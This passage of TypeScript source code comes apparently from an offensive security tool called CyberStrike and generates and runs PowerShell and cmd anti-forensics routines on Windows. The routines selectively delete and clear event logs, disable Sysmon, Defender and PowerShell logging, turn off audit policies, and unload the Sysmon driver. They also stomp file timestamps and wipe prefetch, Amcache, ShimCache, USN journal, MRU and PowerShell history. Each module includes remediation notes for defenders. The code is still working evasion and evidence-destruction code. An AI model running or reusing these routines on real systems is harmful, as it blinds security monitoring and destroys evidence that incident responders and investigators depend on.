Write-Output "[*] Filter: ${eventId || "4688 (process create) + 4104 (script block)"}"
Write-Output ""

$events = Get-WinEvent -LogName '${logName}' -ErrorAction SilentlyContinue | Where-Object {
    (${filterExpr}) -and (${timeFilter})
}

Write-Output "[*] Matching events: $($events.Count)"

if ($events.Count -gt 0) {
    Write-Output "[*] Sample events:"
    foreach ($e in $events | Select-Object -First 5) {
        Write-Output "    ID: $($e.Id) | Time: $($e.TimeCreated) | $($e.Message.Substring(0, [math]::Min(80, $e.Message.Length)))"
    }

    Write-Output ""
    Write-Output "[*] Selective removal requires direct EVTX manipulation"
    Write-Output "[*] Method 1: Stop EventLog service -> parse EVTX -> remove records -> restart"
    Write-Output "[*] Method 2: Use EvtClearLog API with custom filter (leaves 1102 event)"
    Write-Output "[*] Method 3: Overwrite individual records with null data"
    Write-Output ""

    try {
        $logPath = (Get-WinEvent -ListLog '${logName}').LogFilePath
        Write-Output "[*] Log file: $logPath"
        $logSize = (Get-Item $logPath -ErrorAction SilentlyContinue).Length
        Write-Output "[*] Log size: $([math]::Round($logSize/1MB, 2)) MB"

        Write-Output ""
        Write-Output "[*] Attempting targeted removal via wevtutil..."
        $beforeCount = (Get-WinEvent -LogName '${logName}' -ErrorAction SilentlyContinue).Count

        $tempEvtx = "$env:TEMP\\cs-evtlog-backup-$(Get-Date -Format 'yyyyMMddHHmmss').evtx"
        wevtutil epl '${logName}' $tempEvtx "/q:*[System[(${eventId ? "EventID!=${eventId}" : "EventID!=4688 and EventID!=4104"})]]" 2>&1
        Write-Output "[+] Filtered export: $tempEvtx"

        wevtutil cl '${logName}' 2>&1
        Write-Output "[+] Log cleared"

        wevtutil im $tempEvtx /lf:$tempEvtx 2>&1
        Write-Output "[*] Note: full restore requires custom parsing — backup preserved at $tempEvtx"

        $afterCount = (Get-WinEvent -LogName '${logName}' -ErrorAction SilentlyContinue).Count
        Write-Output "[*] Events before: $beforeCount -> after: $afterCount"
    } catch {
        Write-Output "[-] Selective removal failed: $($_.Exception.Message)"
        Write-Output "[*] Requires SYSTEM privileges — try: winhook token_impersonate --action exploit"
    }
} else {
    Write-Output "[+] No matching events found"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-EVTTAMP-001",
      provider: "windows",
      severity: "high",
      status: "EXECUTED",
      resource: `eventlog://${logName}`,
      title: `Selective event removal from ${logName} log`,
      details: r.stdout.substring(0, 500),
      remediation: "Forward logs to SIEM in real-time. Use immutable log storage. Monitor Event ID 1102 (log cleared).",
    })
  }

  if (action === "disable-source") {
    const script = `
Write-Output "=== Disable Event Log Sources ==="

$dangerousSources = @{
    'Microsoft-Windows-PowerShell/Operational' = 'PowerShell script block logging'
    'Microsoft-Windows-Sysmon/Operational' = 'Sysmon process/network monitoring'
    'Microsoft-Windows-Windows Defender/Operational' = 'Defender detection alerts'
    'Microsoft-Windows-TaskScheduler/Operational' = 'Scheduled task creation'
    'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational' = 'RDP session tracking'
    'Microsoft-Windows-WMI-Activity/Operational' = 'WMI activity monitoring'
}

foreach ($source in $dangerousSources.Keys) {
    $log = Get-WinEvent -ListLog $source -ErrorAction SilentlyContinue
    if ($log) {
        $status = if ($log.IsEnabled) { 'ENABLED' } else { 'DISABLED' }
        Write-Output "[$status] $source — $($dangerousSources[$source])"
        Write-Output "    Records: $($log.RecordCount) | Max size: $([math]::Round($log.MaximumSizeInBytes/1MB, 1)) MB"

        if ($log.IsEnabled) {
            try {
                $log.IsEnabled = $false
                $log.SaveChanges()
                Write-Output "    [+] DISABLED"
            } catch {
                Write-Output "    [-] Failed to disable: $($_.Exception.Message)"
            }
        }
    }
}

Write-Output ""
Write-Output "[!] Restore: Get-WinEvent -ListLog 'source' | % { \$_.IsEnabled=\$true; \$_.SaveChanges() }"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-EVTTAMP-002",
      provider: "windows",
      severity: "high",
      status: "EXECUTED",
      resource: "eventlog://sources",
      title: "Security-relevant event log sources disabled",
      details: r.stdout.substring(0, 500),
      remediation: "Monitor for event log source disable events. Use GPO to enforce log source configuration.",
    })
  }

  if (action === "audit-policy") {
    const script = `
Write-Output "=== Audit Policy Manipulation ==="

Write-Output "[*] Current audit policy:"
auditpol /get /category:* 2>&1 | ForEach-Object { Write-Output "    $_" }

Write-Output ""
Write-Output "[*] Disabling key audit subcategories..."

$subcategories = @(
    'Process Creation',
    'Logon',
    'Special Logon',
    'Sensitive Privilege Use',
    'Directory Service Access',
    'Kerberos Authentication Service',
    'Kerberos Service Ticket Operations',
    'Other Object Access Events'
)

foreach ($sub in $subcategories) {
    $result = auditpol /set /subcategory:"$sub" /success:disable /failure:disable 2>&1
    if ($LASTEXITCODE -eq 0) {
        Write-Output "[+] Disabled: $sub"
    } else {
        Write-Output "[-] Failed: $sub — $result"
    }
}

Write-Output ""
Write-Output "[!] These events will no longer be generated until audit policy is restored"
Write-Output "[*] Restore: auditpol /set /subcategory:'Process Creation' /success:enable /failure:enable"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-EVTTAMP-003",
      provider: "windows",
      severity: "critical",
      status: "EXECUTED",
      resource: "auditpol://subcategories",
      title: "Audit policy subcategories disabled — no new security events generated",
      details: r.stdout.substring(0, 500),
      remediation:
        "Enforce audit policies via GPO. Monitor Event ID 4719 (audit policy changed). Alert on auditpol.exe execution.",
    })
  }

  if (action === "resize") {
    const script = `
Write-Output "=== Event Log Resize (Force Rollover) ==="

$logs = @('Security','System','Application','Windows PowerShell')

foreach ($logName in $logs) {
    try {
        $log = Get-WinEvent -ListLog $logName -ErrorAction Stop
        $currentSize = $log.MaximumSizeInBytes
        $currentRecords = $log.RecordCount
        Write-Output "[*] $logName — $currentRecords records, max $([math]::Round($currentSize/1MB, 1)) MB"

        $log.MaximumSizeInBytes = 64KB
        $log.SaveChanges()
        Write-Output "[+] Resized to 64 KB — old events will be overwritten"
    } catch {
        Write-Output "[-] $logName — $($_.Exception.Message)"
    }
}

Write-Output ""
Write-Output "[*] Logs will auto-overwrite oldest events as new events are generated"
Write-Output "[*] Restore: wevtutil sl Security /ms:20971520 (20 MB default)"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-EVTTAMP-004",
      provider: "windows",
      severity: "high",
      status: "EXECUTED",
      resource: "eventlog://resize",
      title: "Event logs resized to 64 KB — forces rapid rollover and evidence loss",
      details: r.stdout.substring(0, 500),
      remediation: "Monitor log size changes. Enforce minimum log size via GPO. Forward logs to SIEM before rollover.",
    })
  }

  if (action === "disable-sysmon") {
    const script = `
Write-Output "=== Sysmon Neutralization ==="

$sysmonService = Get-Service Sysmon* -ErrorAction SilentlyContinue
$sysmonProcess = Get-Process Sysmon* -ErrorAction SilentlyContinue
$sysmonDriver = Get-WmiObject Win32_SystemDriver -Filter "Name LIKE 'SysmonDrv%'" -ErrorAction SilentlyContinue

if ($sysmonService) {
    Write-Output "[*] Sysmon service: $($sysmonService.Name) — $($sysmonService.Status)"
} else {
    Write-Output "[-] Sysmon service not found"
}

if ($sysmonProcess) {
    Write-Output "[*] Sysmon process: PID $($sysmonProcess.Id)"
}

if ($sysmonDriver) {
    Write-Output "[*] Sysmon driver: $($sysmonDriver.Name) — $($sysmonDriver.State)"
}

if (-not $sysmonService -and -not $sysmonProcess) {
    Write-Output "[+] Sysmon is NOT installed"
} else {
    Write-Output ""
    Write-Output "[*] Sysmon neutralization methods:"

    Write-Output "[*] Method 1: Unload Sysmon driver"
    try {
        fltMC unload SysmonDrv 2>&1
        Write-Output "[+] SysmonDrv filter unloaded"
    } catch {
        Write-Output "[-] Driver unload failed — requires SYSTEM"
    }

    Write-Output "[*] Method 2: Disable Sysmon event log"
    try {
        $sysmonLog = Get-WinEvent -ListLog 'Microsoft-Windows-Sysmon/Operational' -ErrorAction Stop
        $sysmonLog.IsEnabled = $false
        $sysmonLog.SaveChanges()
        Write-Output "[+] Sysmon Operational log disabled"
    } catch {
        Write-Output "[-] Log disable failed"
    }

    Write-Output "[*] Method 3: Blind Sysmon config"
    Write-Output "[*] Replace config with: sysmon -c -- (remove all rules)"
    Write-Output "[*] Or patch minifilter altitude to deprioritize"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-EVTTAMP-005",
      provider: "windows",
      severity: "critical",
      status: "EXECUTED",
      resource: "sysmon://driver",
      title: "Sysmon detection and neutralization",
      details: r.stdout.substring(0, 500),
      remediation:
        "Protect Sysmon with tamper protection. Monitor for SysmonDrv unload. Use kernel-level Sysmon protection.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function antiForensics(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "full"
  const target = argVal(args, "--target")
  const timestamp = argVal(args, "--timestamp")
  const reference = argVal(args, "--reference")
  const findings: Finding[] = []
  const output: string[] = ["[*] Anti-forensics operations...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    if (action === "stomp" || action === "full") {
      output.push("=== Timestamp Stomping (cmd.exe) ===\n")
      output.push("[!] Native cmd.exe cannot modify file timestamps directly")
      output.push("[*] Workaround: copy /b file+nul file (resets modification time)")
      output.push("[*] Alternative: Use VBScript to set file dates:")
      output.push('    Set fso = CreateObject("Scripting.FileSystemObject")')
      output.push('    Set f = fso.GetFile("target.exe")')
      output.push("    ... (VBS can read but not reliably set timestamps)")
      output.push("[*] Best approach: Use --exec ps or deploy compiled timestomp binary")
      if (target) {
        const r = await cmd(`dir "${target}" /tc /tw /ta`, timeout)
        output.push(`\n[*] Current timestamps for ${target}:`)
        output.push(r.stdout.trim())
      }
    }
    if (action === "prefetch" || action === "full") {
      output.push("\n=== Prefetch Cleanup (cmd.exe) ===")
      await cmd('del /q "C:\\Windows\\Prefetch\\*CYBERSTRIKE*" 2>nul', timeout)
      await cmd('del /q "C:\\Windows\\Prefetch\\*CS-*" 2>nul', timeout)
      await cmd('del /q "C:\\Windows\\Prefetch\\*POWERSHELL*" 2>nul', timeout)
      output.push("[+] Cleared suspicious prefetch entries (cyberstrike, cs-, powershell)")
    }
    if (action === "amcache" || action === "full") {
      output.push("\n=== Amcache Cleanup (cmd.exe) ===")
      output.push("[!] Amcache.hve is locked by OS — cannot modify with cmd.exe alone")
      output.push("[*] Workaround: reg delete the Amcache InventoryApplicationFile entries:")
      const amcache = await cmd('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModel\\StateRepository\\Cache\\Application" /s 2>nul | findstr /i "cyberstrike cs-"', timeout)
      if (amcache.stdout.trim()) {
        output.push("[!] CyberStrike references found in registry:")
        output.push(amcache.stdout.trim().split("\n").slice(0, 10).join("\n"))
      }
      output.push("[*] Best approach: Use --exec ps for full Amcache manipulation")
    }
    if (action === "usn" || action === "full") {
      output.push("\n=== USN Journal Cleanup (cmd.exe) ===")
      const del = await cmd("fsutil usn deletejournal /n C: 2>nul", timeout)
      output.push(del.exitCode === 0 ? "[+] USN journal deleted" : `[!] USN delete failed: ${del.stderr}`)
      const create = await cmd("fsutil usn createjournal m=1048576 a=65536 C: 2>nul", timeout)
      output.push(create.exitCode === 0 ? "[+] Clean USN journal created" : `[!] USN create failed: ${create.stderr}`)
    }
    if (action === "full") {
      output.push("\n=== Event Logs (cmd.exe) ===")
      for (const log of ["Security", "System", "Application", "Windows PowerShell"]) {
        const r = await cmd(`wevtutil cl "${log}" 2>nul`, timeout)
        output.push(r.exitCode === 0 ? `[+] Cleared: ${log}` : `[!] Failed: ${log}`)
      }
      output.push("\n=== Recent Files ===")
      await cmd('del /q "%APPDATA%\\Microsoft\\Windows\\Recent\\*.*" 2>nul', timeout)
      output.push("[+] Cleared Recent folder")
      await cmd('del /q "%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" 2>nul', timeout)
      output.push("[+] Cleared PowerShell history")
    }
    findings.push({ checkId: "WIN-ANTIFORENSICS-001", provider: "windows", severity: "high", status: "EXECUTED", resource: "windows://antiforensics", title: `Anti-forensics via cmd.exe (${action})`, details: "wevtutil, fsutil, del operations", remediation: "Monitor for forensic artifact manipulation." })
    return { output: output.join("\n"), findings }
  }

  if (action === "stomp" || action === "full") {
    const tsExpr = timestamp
      ? `[DateTime]::Parse('${timestamp}')`
      : reference
        ? `(Get-Item '${reference}').LastWriteTime`
        : `(Get-Date).AddDays(-30)`
    const targetPath = target || "."
    const script = `
$targetTime = ${tsExpr}
$files = @()
if (Test-Path '${targetPath}' -PathType Container) {
  $files = Get-ChildItem '${targetPath}' -File -Recurse -ErrorAction SilentlyContinue | Select-Object -First 50
} else {
  $files = @(Get-Item '${targetPath}' -ErrorAction SilentlyContinue)
}

Write-Output "=== Timestamp Stomping ==="
Write-Output "Target time: $targetTime"
Write-Output ""

$stomped = 0
foreach ($f in $files) {
  try {
    $origCreate = $f.CreationTime
    $origModify = $f.LastWriteTime
    $origAccess = $f.LastAccessTime
    $f.CreationTime = $targetTime
    $f.LastWriteTime = $targetTime
    $f.LastAccessTime = $targetTime
    Write-Output "[+] $($f.FullName)"
    Write-Output "    Created:  $origCreate -> $targetTime"
    Write-Output "    Modified: $origModify -> $targetTime"
    Write-Output "    Accessed: $origAccess -> $targetTime"
    $stomped++
  } catch {
    Write-Output "[-] Failed: $($f.FullName) — $($_.Exception.Message)"
  }
}
Write-Output ""
Write-Output "[*] Stomped $stomped files"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-ANTIFOR-001",
      provider: "windows",
      severity: "medium",
      status: "EXECUTED",
      resource: "filesystem://timestamps",
      title: "File timestamps modified to evade timeline analysis",
      details: r.stdout.substring(0, 500),
      remediation: "Verify file timestamps against MFT $SI vs $FN attributes using forensic tools.",
    })
  }

  if (action === "prefetch" || action === "full") {
    const script = `
Write-Output "=== Prefetch Cleanup ==="
$prefetchPath = "$env:SystemRoot\\Prefetch"
if (Test-Path $prefetchPath) {
  $prefetchFiles = Get-ChildItem $prefetchPath -Filter "*.pf" -ErrorAction SilentlyContinue
  $count = $prefetchFiles.Count
  Write-Output "[*] Found $count prefetch files"

  $suspicious = $prefetchFiles | Where-Object { $_.Name -match 'POWERSHELL|CMD|WMIC|MSHTA|CERTUTIL|REGSVR32|MSBUILD|RUNDLL32|CSCRIPT|WSCRIPT' }
  Write-Output "[*] Suspicious prefetch entries: $($suspicious.Count)"
  foreach ($pf in $suspicious) {
    Write-Output "    [!] $($pf.Name) — LastRun: $($pf.LastWriteTime)"
  }

  foreach ($pf in $suspicious) {
    try {
      Remove-Item $pf.FullName -Force -ErrorAction Stop
      Write-Output "[+] Removed: $($pf.Name)"
    } catch {
      Write-Output "[-] Failed to remove: $($pf.Name) — $($_.Exception.Message)"
    }
  }
} else {
  Write-Output "[-] Prefetch directory not found (may be disabled)"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-ANTIFOR-002",
      provider: "windows",
      severity: "medium",
      status: "EXECUTED",
      resource: "filesystem://prefetch",
      title: "Removed suspicious prefetch entries to hide execution evidence",
      details: r.stdout.substring(0, 500),
      remediation: "Monitor Prefetch directory with integrity checks. Sysmon Event ID 23 tracks file deletes.",
    })
  }

  if (action === "amcache" || action === "full") {
    const script = `
Write-Output "=== Amcache Cleanup ==="
$amcachePath = "$env:SystemRoot\\appcompat\\Programs\\Amcache.hve"
if (Test-Path $amcachePath) {
  $acl = Get-Acl $amcachePath -ErrorAction SilentlyContinue
  Write-Output "[*] Amcache.hve found: $amcachePath"
  Write-Output "[*] Size: $((Get-Item $amcachePath).Length) bytes"
  Write-Output "[*] Last modified: $((Get-Item $amcachePath).LastWriteTime)"
  Write-Output ""
  Write-Output "[*] Amcache is locked by the system — requires offline access or reg load"
  Write-Output "[*] Attempting registry-based cleanup..."

  try {
    $tempKey = "HKLM\\TEMP_AMCACHE_$(Get-Random)"
    $loadResult = reg load $tempKey $amcachePath 2>&1
    if ($LASTEXITCODE -eq 0) {
      $rootKey = Get-ChildItem "Registry::$tempKey\\Root" -ErrorAction SilentlyContinue
      $inventoryApp = Get-ChildItem "Registry::$tempKey\\Root\\InventoryApplicationFile" -ErrorAction SilentlyContinue
      Write-Output "[*] Amcache entries: $($inventoryApp.Count)"

      foreach ($entry in $inventoryApp) {
        $name = $entry.GetValue("Name")
        $path = $entry.GetValue("LowerCaseLongPath")
        if ($name -match 'powershell|cmd|wmic|mshta|certutil|regsvr32|msbuild|cscript') {
          Write-Output "[!] Suspicious: $name — $path"
          Remove-Item $entry.PSPath -Recurse -Force -ErrorAction SilentlyContinue
          Write-Output "[+] Removed entry: $name"
        }
      }
      reg unload $tempKey 2>&1 | Out-Null
      Write-Output "[+] Amcache cleanup complete"
    } else {
      Write-Output "[-] Cannot load Amcache (in use): $loadResult"
      Write-Output "[*] Alternative: copy Amcache.hve to temp, clean offline, restore"
    }
  } catch {
    Write-Output "[-] Amcache cleanup failed: $($_.Exception.Message)"
  }
} else {
  Write-Output "[-] Amcache.hve not found"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-ANTIFOR-003",
      provider: "windows",
      severity: "medium",
      status: "EXECUTED",
      resource: "registry://amcache",
      title: "Attempted removal of execution evidence from Amcache registry hive",
      details: r.stdout.substring(0, 500),
      remediation: "Backup Amcache.hve regularly. Monitor registry hive load/unload with Sysmon Event ID 12/13.",
    })
  }

  if (action === "usn" || action === "full") {
    const script = `
Write-Output "=== USN Journal Manipulation ==="
$drives = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3" | Select-Object -ExpandProperty DeviceID

foreach ($drive in $drives) {
  Write-Output "[*] Drive: $drive"

  try {
    $usnInfo = fsutil usn queryjournal $drive 2>&1
    if ($LASTEXITCODE -eq 0) {
      Write-Output $usnInfo
      Write-Output ""

      $deleteResult = fsutil usn deletejournal /d $drive 2>&1
      if ($LASTEXITCODE -eq 0) {
        Write-Output "[+] USN journal deleted on $drive"
        $createResult = fsutil usn createjournal m=1000 a=100 $drive 2>&1
        Write-Output "[+] Fresh USN journal created on $drive (minimal size)"
      } else {
        Write-Output "[-] Failed to delete USN journal: $deleteResult"
      }
    } else {
      Write-Output "[-] No USN journal on $drive"
    }
  } catch {
    Write-Output "[-] Error on $drive — $($_.Exception.Message)"
  }
  Write-Output ""
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-ANTIFOR-004",
      provider: "windows",
      severity: "high",
      status: "EXECUTED",
      resource: "filesystem://usn-journal",
      title: "Deleted and recreated USN change journal to remove file operation history",
      details: r.stdout.substring(0, 500),
      remediation: "Monitor fsutil.exe execution. Alert on USN journal deletion (requires kernel-level monitoring).",
    })
  }

  if (action === "shimcache" || action === "full") {
    const script = `
Write-Output "=== ShimCache (AppCompatCache) Cleanup ==="
$shimPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache"

try {
  $shimData = Get-ItemProperty $shimPath -Name AppCompatCache -ErrorAction Stop
  $dataSize = $shimData.AppCompatCache.Length
  Write-Output "[*] AppCompatCache size: $dataSize bytes"

  $backupPath = "$env:TEMP\\shimcache_backup_$(Get-Date -Format 'yyyyMMddHHmmss').bin"
  [System.IO.File]::WriteAllBytes($backupPath, $shimData.AppCompatCache)
  Write-Output "[*] Backup saved: $backupPath"

  $header = $shimData.AppCompatCache[0..3]
  $emptyCache = New-Object byte[] 4
  [Array]::Copy($header, $emptyCache, 4)
  Set-ItemProperty $shimPath -Name AppCompatCache -Value $emptyCache -Type Binary
  Write-Output "[+] ShimCache cleared (header preserved, entries removed)"
  Write-Output "[!] Changes take effect after reboot"
} catch {
  Write-Output "[-] ShimCache cleanup failed: $($_.Exception.Message)"
  Write-Output "[*] May require SYSTEM privileges"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-ANTIFOR-005",
      provider: "windows",
      severity: "medium",
      status: "EXECUTED",
      resource: "registry://shimcache",
      title: "Cleared AppCompatCache to remove program execution evidence",
      details: r.stdout.substring(0, 500),
      remediation: "Monitor AppCompatCache registry key modifications with Sysmon Event ID 13.",
    })
  }

  if (action === "recent" || action === "full") {
    const script = `
Write-Output "=== Recent Docs / Jump Lists Cleanup ==="

$recentPath = "$env:APPDATA\\Microsoft\\Windows\\Recent"
$jumpListAuto = "$env:APPDATA\\Microsoft\\Windows\\Recent\\AutomaticDestinations"
$jumpListCustom = "$env:APPDATA\\Microsoft\\Windows\\Recent\\CustomDestinations"

$recentCount = (Get-ChildItem $recentPath -File -ErrorAction SilentlyContinue).Count
Write-Output "[*] Recent items: $recentCount"

$autoCount = (Get-ChildItem $jumpListAuto -ErrorAction SilentlyContinue).Count
Write-Output "[*] Automatic jump list entries: $autoCount"

$customCount = (Get-ChildItem $jumpListCustom -ErrorAction SilentlyContinue).Count
Write-Output "[*] Custom jump list entries: $customCount"

Write-Output ""
Write-Output "[*] Clearing recent documents..."
Remove-Item "$recentPath\\*.lnk" -Force -ErrorAction SilentlyContinue
Write-Output "[+] Recent .lnk files cleared"

Write-Output "[*] Clearing automatic jump lists..."
Remove-Item "$jumpListAuto\\*" -Force -ErrorAction SilentlyContinue
Write-Output "[+] Automatic destinations cleared"

Write-Output "[*] Clearing custom jump lists..."
Remove-Item "$jumpListCustom\\*" -Force -ErrorAction SilentlyContinue
Write-Output "[+] Custom destinations cleared"

$explorerDialogMRU = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlMRU"
if (Test-Path $explorerDialogMRU) {
  Get-ChildItem $explorerDialogMRU | ForEach-Object { Remove-Item $_.PSPath -Recurse -Force -ErrorAction SilentlyContinue }
  Write-Output "[+] Explorer Open/Save MRU cleared"
}

$typedPaths = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths"
if (Test-Path $typedPaths) {
  Remove-ItemProperty $typedPaths -Name "url*" -ErrorAction SilentlyContinue
  Write-Output "[+] Explorer typed paths cleared"
}

$runMRU = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
if (Test-Path $runMRU) {
  Remove-ItemProperty $runMRU -Name "[a-z]" -ErrorAction SilentlyContinue
  Remove-ItemProperty $runMRU -Name "MRUList" -ErrorAction SilentlyContinue
  Write-Output "[+] Run dialog MRU cleared"
}

Write-Output ""
Write-Output "[*] Cleanup complete — recent activity evidence removed"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-ANTIFOR-006",
      provider: "windows",
      severity: "low",
      status: "EXECUTED",
      resource: "filesystem://recent-docs",
      title: "Cleared recent documents, jump lists, MRU lists, and Explorer history",
      details: r.stdout.substring(0, 500),
      remediation: "Monitor Recent folder and registry MRU keys for mass deletion events.",
    })
  }

  return { output: output.join("\n"), findings }
}
